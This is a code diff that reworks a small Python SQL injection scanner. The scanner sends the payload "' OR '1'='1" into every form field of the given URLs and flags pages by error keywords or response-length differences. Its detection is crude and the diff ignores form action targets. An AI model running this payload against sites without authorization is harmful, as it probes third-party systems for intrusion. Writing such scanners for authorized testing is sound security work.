@@ -3,6 +3,8 @@ from bs4 import BeautifulSoup
 
 def scan_sql_injection(url_list):
     payload = "' OR '1'='1"
+    normal_value = "test123"
+
     vulnerable = []
 
     for url in url_list:
@@ -13,30 +15,42 @@ def scan_sql_injection(url_list):
             forms = soup.find_all("form")
 
             for form in forms:
-                action = form.get("action")
                 method = form.get("method", "get").lower()
-
                 inputs = form.find_all("input")
 
-                data = {}
+                normal_data = {}
+                injected_data = {}
+
                 for inp in inputs:
                     name = inp.get("name")
                     if name:
-                        data[name] = payload
+                        normal_data[name] = normal_value
+                        injected_data[name] = payload
 
-                target = url if not action else url + action
-
+                # send normal request
                 if method == "post":
-                    response = requests.post(url, data=data)
+                    normal_res = requests.post(url, data=normal_data)
+                    injected_res = requests.post(url, data=injected_data)
                 else:
-                    response = requests.get(url, params=data)
+                    normal_res = requests.get(url, params=normal_data)
+                    injected_res = requests.get(url, params=injected_data)
 
-                content = response.text.lower()
+                normal_text = normal_res.text.lower()
+                injected_text = injected_res.text.lower()
 
-                if "sql syntax" in content or "database error" in content:
+                #  Detection Method 1: Error-Based 
+                if "sql" in injected_text or "syntax" in injected_text:
                     vulnerable.append(url)
+                    continue
 
-        except Exception as e:
-            print("Error scanning:", url)
+                #  Detection Method 2: Response Difference 
+                if len(injected_text) != len(normal_text):
+                    diff = abs(len(injected_text) - len(normal_text))
 
-    return vulnerable
+                    if diff > 50:  # threshold to avoid noise
+                        vulnerable.append(url)
+
+        except Exception:
+            continue
+
+    return list(set(vulnerable))
